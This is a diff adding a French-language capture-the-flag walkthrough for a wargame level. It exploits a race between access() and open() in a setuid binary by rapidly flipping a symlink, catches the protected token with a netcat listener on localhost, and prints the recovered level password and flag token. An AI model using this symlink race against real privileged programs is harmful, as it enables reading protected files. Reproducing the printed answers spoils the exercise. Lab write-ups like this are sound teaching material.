@@ -1,12 +1,50 @@
+le binaire level10 envoie le contenue du fichier a un server
 $> ./level10
 ./level10 file host
 	sends file to host if you have access to it
 
-$> ./level10 token host
+$> ./level10 /tmp/a 127.0.0.1
+Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
+
+on cree un server qui attend une connection sur localhost port 6969
+nc -l 6969
+
+$> ./level10 token 127.0.0.1
 You don't have access to token
 
+le binaire level10 verifie avec la fonction access si on a les droit sur le fichier qu'on veut envoyer
 $> strings level10
 open
 access
 
+il y a une race condition entre l'appel de access et de open
+on cree un script hack_access.sh qui cree un lien symbolic et qui redirige ce lien soit sur le fichier token qu'on veut lire soit sur un autre fichier dont on a les droit
+on a 1 chance sur 2 que lors de access le lien symbolic redirige sur le fichier dont on a les droit
+et on a 1 chance sur 2 que lors de open le lien symbolic redirige sur le fichier token qu'on veut afficher
+donc on lance le script qui va change le lien symbolic dans une boucle infinie
+$> ./hack_access.sh /tmp/link $HOME/token /tmp/token &
 
+$> nc -l 6969 &
+$> ./level10 /tmp/link 127.0.0.1
+Sending file .. wrote file!
+.*( )*.
+fake token
+
+$> nc -l 6969 &
+$> ./level10 /tmp/link 127.0.0.1
+You don't have access to token
+
+$> nc -l 6969 &
+$> ./level10 /tmp/link 127.0.0.1
+Sending file .. wrote file!
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+
+le password de flag10 est woupa2yuojeeaaed06riuj63c
+
+$> su flag10
+Password:
+Don't forget to launch getflag !
+
+$> getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
